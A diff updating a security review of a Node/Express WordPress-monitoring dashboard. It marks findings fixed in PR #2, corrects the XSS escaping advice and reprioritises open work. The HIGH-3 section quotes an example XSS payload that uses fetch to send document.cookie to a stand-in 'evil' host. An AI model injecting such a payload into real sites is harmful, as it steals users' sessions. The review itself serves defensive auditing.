@@ -2,6 +2,11 @@
 
 Review date: 2026-08-02 · Reviewed at commit `5296368` · Scope: whole repository
 
+> **Status:** six findings have since been fixed in PR #2 and are marked
+> `[FIXED in #2]` below. Everything else in this document is still open.
+> The two that most need attention next are **CRITICAL-2** (the plugin updater
+> installs unsigned code) and the repo-hygiene cleanup in section 3.
+
 The app is a Node/Express dashboard that sweeps a set of WordPress sites (HTTPS, SSL,
 Cloudflare, tracking scripts, PageSpeed, plugin updates, security headers), pulls tasks
 from ClickUp and Zoho Projects, and talks to a companion WordPress helper plugin plus a
@@ -17,7 +22,7 @@ as you move to a code-first workflow.
 
 ## 1. Security
 
-### CRITICAL-1 — The license key is leaked to every signed-in user, defeating role permissions
+### CRITICAL-1 — The license key is leaked to every signed-in user, defeating role permissions  `[FIXED in #2]`
 
 `src/db.js:62` sets `helper.token` to the site's license key, and `src/server.js:359`
 redacts only `license.key`:
@@ -72,7 +77,7 @@ fleet-wide RCE. `plugins_api` is also spoofed so hub-supplied HTML renders in wp
 
 Then move the hub to a domain you own rather than a platform subdomain.
 
-### HIGH-3 — XSS through `esc()`, which does not escape single quotes
+### HIGH-3 — XSS through `esc()`, which does not escape single quotes  `[FIXED in #2]`
 
 `public/index.html:614`:
 
@@ -94,9 +99,15 @@ handler today. A status named `x'});fetch('//evil/?c='+document.cookie)//` execu
 every dashboard user. The code already knows about this and hand-strips quotes in two
 spots (`index.html:1070`, `1634`) but not the rest.
 
-**Fix:** add `'` → `&#39;` to `esc()` immediately (one line, stops the bleeding), then
-migrate to event delegation with `dataset` attributes so handlers are never built by
-string concatenation.
+**Fix:** *(corrected — the original advice here was wrong.)* Adding `'` → `&#39;` to
+`esc()` is **not** sufficient on its own. HTML entity decoding happens before an
+attribute's value is parsed as JavaScript, so `&#39;` decodes straight back to `'` and
+still terminates the string literal. The value has to be escaped for the *JS string*
+context: backslash-escape `\` and `'` first, then HTML-escape the result, so the
+post-decode text is a valid JS string. PR #2 adds `escJs()` for exactly this and applies
+it to the handler arguments carrying free text or third-party data. The durable fix is
+still to migrate to event delegation with `dataset` attributes so handlers are never
+built by string concatenation.
 
 ### HIGH-4 — License key travels in URL query strings
 
@@ -138,7 +149,7 @@ legacy file from the repo and audit deployed sites for the constant.
 |---|---|---|
 | M-1 | Analytics `/collect` has no rate limiting and trusts site identity from `Origin`/`Referer`/body, so anyone can poison any site's stats or inflate D1 writes. Bot filter is UA-regex only. | `analytics-worker/worker.js:46-95` |
 | M-2 | Postgres pool sets `ssl: { rejectUnauthorized: false }`, disabling certificate validation on all DB traffic. Use Supabase's CA bundle instead. | `src/db.js:41` |
-| M-3 | No `helmet`, no CSP, and no rate limiting on the dashboard itself — while `checks/security.js:83` flags other sites for missing CSP. | `src/server.js:46-51` |
+| M-3 | No `helmet`, no CSP, and no rate limiting on the dashboard itself — while `checks/security.js:83` flags other sites for missing CSP. *Rate limiting on the public routes is `[FIXED in #2]`; helmet/CSP is still open and needs the inline scripts extracted first (section 4).* | `src/server.js:46-51` |
 | M-4 | `javascript:` URLs render as clickable links; `esc()` doesn't neutralise schemes. Social links are user-entered with only `editSocial`. | `index.html:1406, 1557, 1608, 1709` |
 | M-5 | SSRF: `helper_endpoint` is free text, fetched server-side with the bearer token attached, and errors echo back response detail. Requires `manageWebsites`, so it's privilege-limited — but validate the host resolves publicly and matches the site's own domain. | `src/checks/plugins.js:17-30`, `src/server.js:299-309` |
 | M-6 | Hub-supplied `analytics_url` is injected into an inline `<script>` on every visitor page with no scheme/host allowlist; a compromised hub silently redirects visitor beacons. Also collects referrers with no consent hook (GDPR). | `includes/analytics.php:45-49` |
@@ -146,7 +157,7 @@ legacy file from the repo and audit deployed sites for the constant.
 | M-8 | Cron jobs are scheduled from `init` on every request instead of `register_activation_hook` — a DB check per page load. | `security-scan.php:197`, `analytics.php:61` |
 | M-9 | Security scanner iterates with `FOLLOW_SYMLINKS`, so an uploads symlink can walk outside the web root. | `security-scan.php:65` |
 | M-10 | License key stored as an autoloaded plaintext option, so it rides in `alloptions` on every request. Pass `autoload => false`. | `admin.php:58` |
-| M-11 | `/api/license/validate` is public and unthrottled, and returns the site name — an enumeration oracle. Keys are 80-bit so brute force is impractical, but it should still be rate limited. | `src/server.js:58` |
+| M-11 | `/api/license/validate` is public and unthrottled, and returns the site name — an enumeration oracle. Keys are 80-bit so brute force is impractical, but it should still be rate limited. `[FIXED in #2]` | `src/server.js:58` |
 | M-12 | Worker `/stats` sends `Access-Control-Allow-Origin: *`, and compares the stats key non-constant-time. Visitor hashing falls back to the literal salt `"salt"` if `STATS_KEY` is unset. | `worker.js:18-22, 80, 102` |
 
 Good news: no SQL injection anywhere (parameterised throughout, both `pg` and D1); no
@@ -158,7 +169,7 @@ never committed (verified against full history).
 
 ## 2. Bugs
 
-**HIGH — The transient sweep creates permanent transients.** This is in your newest
+**HIGH — The transient sweep creates permanent transients.** `[FIXED in #2]` This is in your newest
 feature (`5296368`). `includes/optimize.php:205-208` deletes *all* `_transient_timeout_*`
 rows, not just orphaned ones:
 
@@ -172,7 +183,8 @@ Any transient whose value row survived the preceding loop loses its timeout row 
 becomes permanent — the exact opposite of the cleanup's purpose. Needs a
 `NOT IN (paired value rows)` condition or a left-join orphan test.
 
-**HIGH — The SSL expiry check can't detect an expired certificate.** `src/checks/ssl.js:22`
+**HIGH — The SSL expiry check can't detect an expired certificate.** `[FIXED in #2 — which also
+newly detects hostname mismatch and self-signed certs.]` `src/checks/ssl.js:22`
 connects with the default `rejectUnauthorized: true`, so an expired cert fails the
 handshake and lands in the error handler at line 47, reporting a generic "TLS error". The
 friendly `daysRemaining < 0 → "Expired"` branch at line 37 is unreachable. The check
@@ -184,7 +196,7 @@ and report trust failures separately.
 task due *today* shows as overdue all day for anyone west of UTC. Compare against
 end-of-day in the site's timezone.
 
-**MEDIUM — `results.json` writes are non-atomic and there is no graceful shutdown.**
+**MEDIUM — `results.json` writes are non-atomic and there is no graceful shutdown.** `[FIXED in #2]`
 `src/store.js:95` does a plain `writeFileSync` of the whole document while
 `src/scheduler.js` sweeps every 60s. A crash or redeploy mid-write truncates the file;
 `loadResults()` then returns the empty fallback, and the next sweep's `diffRuns` treats
@@ -208,7 +220,7 @@ mid-sweep (contrast the security scan, which does budget itself).
   never-checked sites as "Operational", and any unexpected status yields
   `counts[undefined]++` → `NaN` in the stat card.
 - `src/server.js:287` — `const path = OPTIMIZE_ACTIONS[action]` shadows the `node:path`
-  import inside the handler. Harmless today, a landmine for the next edit.
+  import inside the handler. Harmless today, a landmine for the next edit. `[FIXED in #2]`
 - `src/server.js:516` — `clamp` is declared with `const` *after* the handlers at lines 323
   and 340 that call it. Fine at runtime, confusing to read; hoist it.
 - `src/checks/plugins.js:75` — `endpoint.replace(/\/status\/?$/, "/security")` silently
@@ -395,17 +407,22 @@ that would be queryable as JSON.
 
 ## Suggested order of work
 
-**This week — security and data integrity**
-1. Redact `helper.token` for non-`manageWebsites` roles (CRITICAL-1). One-line fix, then
-   the serializer refactor.
-2. Add `'` to `esc()` (HIGH-3). One line.
-3. Fix the transient orphan sweep (HIGH, ships broken today).
-4. Fix `ssl.js` so expired certs are detected (HIGH).
-5. Atomic `results.json` write + `SIGTERM` handler.
-6. Add `helmet` and `express-rate-limit` on `/api/license/validate` and `/api/plugin/*`.
+**Done in PR #2 — security and data integrity**
+1. ~~Redact `helper.token` for non-`manageWebsites` roles (CRITICAL-1).~~ Done via a
+   `websiteView()` serializer; the key no longer reaches a browser at all.
+2. ~~Escape the JS string context in inline handlers (HIGH-3).~~ Done via `escJs()` —
+   note the correction above, `esc()` alone was not enough.
+3. ~~Fix the transient orphan sweep.~~ Done.
+4. ~~Fix `ssl.js` so expired certs are detected.~~ Done, plus untrusted-chain detection.
+5. ~~Atomic `results.json` write + `SIGTERM` handler.~~ Done.
+6. ~~Rate-limit `/api/license/validate` and `/api/plugin/*`.~~ Done with a small
+   in-process limiter (no new dependency). **`helmet`/CSP is still outstanding** — a
+   default CSP blocks the inline scripts and styles in `index.html`, so it has to follow
+   the extraction in step 13.
 
-**Next — supply chain and hygiene**
+**Next — supply chain and hygiene (start here)**
 7. sha256 verification + host allowlist in the updater; `scripts/build-plugin.js`.
+   This is now the highest-severity item still open.
 8. Delete the stale plugin copies, `wpmonitor-helper.php`, the committed zips, and the
    `clickup-update/` and `tasks-modal-update/` folders.
 9. Move the license key out of query strings into an `Authorization` header.
